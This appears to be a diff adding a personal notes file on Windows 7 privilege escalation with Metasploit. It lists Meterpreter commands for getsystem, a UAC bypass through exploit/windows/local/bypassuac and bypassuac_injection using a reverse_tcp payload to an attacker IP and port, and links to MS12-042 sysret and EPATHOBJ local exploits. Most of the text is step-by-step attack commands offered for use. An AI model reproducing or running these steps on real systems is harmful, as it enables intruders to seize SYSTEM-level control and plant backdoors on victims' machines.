@@ -1,2 +1,74 @@
-http://obscuresecurity.blogspot.com/2011/11/old-privilege-escalation-techniques.html
+The session only has limited user rights. This can severely limit actions you can perform on the remote system such as dumping passwords, manipulating the registry, installing backdoors, etc.
+ 
+ 
+Fortunately, Metasploit has a Meterpreter script, ‘getsystem’, that will use a number of different techniques to attempt to gain SYSTEM level privileges on the remote system. There are also various other (local) exploits that can be used to also escalate   privileges.
+ 
+ 
+ 
+- meterpreter  >  use priv
+ 
+- meterpreter  >   getsystem
+
+
+[WINDOWS 7]
+
+When we executing  getsystem  command  it will fail because the  current logged user have not enough privilege to get admin roles and particularly in windows 7 UAC is defaulty enabled.
+ 
+So we first try to bypass UAC enabled in windows  7, Luckily we have windows UAC bypass exploit in metasploit.
+ 
+ 
+Meterpreter on Kali no longer recognized “run bypassuac” instead  we had to use exploit/windows/local/bypassuac.
+BypassUAC   exploit  that allows you to bypass Windows UAC in Windows Vista and Windows 7 both on x86 and x64 operating systems. This issue has still not been patched to-date and can still be exploited on the most recent operating systems.
+ 
+ 
+For that  we need to background the session, and manually  try bypassuac exploit and load the session recently backgrounded and then exploit and execute  getsystem to get admin privilege.
+ 
+ 
+#meterpreter  > background
+ 
+#meterpreter  >   search uac
+ 
+#meterpreter  >   use exploit/windows/local/bypassuac
+ 
+I exploited this machine with the payload i created before,  so try the  method you used  for exploiting the machine before.
+ 
+#meterpreter  >   set payload windows/meterpreter/reverse_tcp
+ 
+#meterpreter  > set   LHOST 192.168.31.20
+ 
+#meterpreter  > set   LPORT  8080
+ 
+#meterpreter  >   set   SESSION 1
+ 
+#meterpreter  >    exploit
+
+
+=====================================
+[Sample #2]
+
+- exploit/windows/local/bypassuac_injection
+- set SESSION 1
+- set payload windows/meterpreter/reverse_tcp
+- set LPORT 8080
+- exploit
+
+
+- exploit/windows/local/bypassuac
+- https://github.com/shjalayeri/sysret
+
+
+
+[Privilege escalation Windows 7]
+
+Windows Vista and later (Windows 7/8,Server 2008/2012) won't allow you to privilege escalate to the SYSTEM directly because of UAC (User Account Control). If the meterpreter session is running with Administrator privileges, you can easily get SYSTEM by using the bypass UAC module (exploit/windows/local/bypassuac). 
+
+If you do not have administrator privileges and the session is running with a normal user privileges, you have to exploit a local vulnerability within the OS. There are two exploits in Windows 7 I can think of: MS-12-042 Sysret for which the exploit is available at https://github.com/shjalayeri/sysret and the latest privilege escalation bug EPATHOBJ::pprFlattenRec Local Privilege Escalation. Note one thing that the sysret exploit will work only on x64 bit machines while EPATHOBJ is only for 32 bit Windows machines.
+
+
+
+
+- https://sathisharthars.wordpress.com/2014/06/19/bypass-uac-and-get-admin-privilege-in-windows-7-using-metasploit/
+
+- http://obscuresecurity.blogspot.com/2011/11/old-privilege-escalation-techniques.html
+
 
